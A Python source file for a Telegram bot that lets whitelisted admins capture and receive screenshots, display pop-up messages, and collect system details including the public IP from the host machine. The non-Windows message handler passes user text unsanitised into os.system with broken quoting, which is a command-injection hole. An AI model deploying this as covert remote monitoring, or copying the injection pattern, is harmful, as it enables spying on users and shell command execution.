import logging
import platform
import subprocess
import urllib.request as urllib

from aiogram import Bot, Dispatcher, executor, types
from config import admins, token
import cv2
import numpy as np
import pyautogui
import os

admins = set(admins)
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=token)
dp = Dispatcher(bot)


@dp.message_handler(commands=["screen"])
async def screen(message: types.Message):
    if message["from"]["id"] in admins:
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        cv2.imwrite("tmp.png", image)
        # await message.answer(message.photo())
        with open('tmp.png', 'rb') as photo:
            await message.answer_document(photo)
        os.remove("tmp.png")


@dp.message_handler(commands=["screensmall"])
async def screen(message: types.Message):
    if message["from"]["id"] in admins:
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        cv2.imwrite("tmp.png", image)
        # await message.answer(message.photo())
        with open('tmp.png', 'rb') as photo:
            await message.answer_photo(photo)
        os.remove("tmp.png")


@dp.message_handler(commands=["msg"])
async def screen(message: types.Message):
    if message["from"]["id"] in admins:
        msg = message.get_args()
        if len(msg) == 0:
            msg = "Hi!"
        msg = str(msg)

        if os.name == "nt":
            sysroot = os.environ['SystemRoot']
            sysnative = os.path.join(sysroot, 'SysNative')
            if not os.path.exists(sysnative):
                sysnative = os.path.join(sysroot, 'System32')

            msgexe_path = os.path.join(sysnative, 'msg.exe')
            subprocess.call([msgexe_path, '*', msg])
        else:
            os.system('msg *' + msg + "'")


@dp.message_handler(commands=["sysinfo"])
async def screen(message: types.Message):
    if message["from"]["id"] in admins:
        ip_public = str(urllib.urlopen("http://ip.42.pl/raw").read())
        data = 'OS: ' + platform.uname()[0] + ' ' + platform.uname()[2] + ' - ' + platform.architecture()[0] + '\n'
        data += 'Node: ' + platform.node() + '\n'
        data += 'PC Name: ' + platform.uname()[1] + '\n'
        data += 'Version: ' + platform.uname()[3] + '\n'
        data += 'System Type: ' + platform.uname()[4] + '\n'
        data += 'Description: ' + platform.uname()[5] + '\n'
        data += 'Public IP: ' + ip_public + '\n'
        data += '\n'
        await message.answer(data)


@dp.message_handler()
async def echo(message: types.Message):
    if message["from"]["id"] in admins:
        await message.answer(message.text)


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
